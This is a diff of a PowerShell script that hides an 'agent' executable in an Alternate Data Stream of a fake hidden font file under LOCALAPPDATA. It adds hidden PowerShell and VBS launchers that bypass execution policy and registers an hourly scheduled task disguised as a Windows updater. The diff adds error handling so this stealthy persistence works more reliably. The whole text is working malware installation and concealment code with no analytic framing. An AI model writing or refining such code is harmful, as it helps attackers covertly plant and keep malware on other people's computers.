@@ -1,19 +1,35 @@
 $ProgressPreference = 'SilentlyContinue'
-$ErrorActionPreference = 'SilentlyContinue'
+$ErrorActionPreference = 'Continue'   # ← Changed from SilentlyContinue to see errors
 
 $agentPath = $env:AgentPath
-if (-not $agentPath) { Write-Output "AgentPath not set."; exit }
+if (-not $agentPath -or -not (Test-Path $agentPath)) {
+    Write-Output "ERROR: AgentPath not set or file missing: '$agentPath'"
+    exit 1
+}
 
-# ---- ADS & launchers ----
+# ---- 1. Fake font file & ADS ----
 $fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
-if (-not (Test-Path $fontDir)) { New-Item -ItemType Directory -Path $fontDir -Force | Out-Null; attrib +h $fontDir }
+if (-not (Test-Path $fontDir)) {
+    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
+    attrib +h $fontDir
+}
 $fontFile = "$fontDir\seguibl.ttf"
-if (-not (Test-Path $fontFile)) { Set-Content -Path $fontFile -Value "TTF fake font file - do not delete" -Encoding ASCII -Force; attrib +h $fontFile }
+if (-not (Test-Path $fontFile)) {
+    Set-Content -Path $fontFile -Value "TTF fake font file - do not delete" -Encoding ASCII -Force
+    attrib +h $fontFile
+}
 
 $streamName = "Zone.Identifier"
-$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
-Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
+try {
+    $agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
+    Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte -ErrorAction Stop
+    Write-Output "Agent written to ADS ($($agentBytes.Length) bytes)"
+} catch {
+    Write-Output "ERROR: Failed to write agent to ADS: $_"
+    exit 1
+}
 
+# ---- 2. Launcher scripts ----
 $launcherPath = "$fontDir\run.ps1"
 $launcherContent = @"
 `$ProgressPreference = 'SilentlyContinue'
@@ -39,7 +55,7 @@ WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launche
 Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
 attrib +h $vbsPath
 
-# ---- Scheduled task: every 1 hour ----
+# ---- 3. Scheduled task: every 1 hour ----
 $taskName = "WindowsUpdaterTask1h"
 schtasks /delete /tn $taskName /f 2>$null
 schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it 2>$null
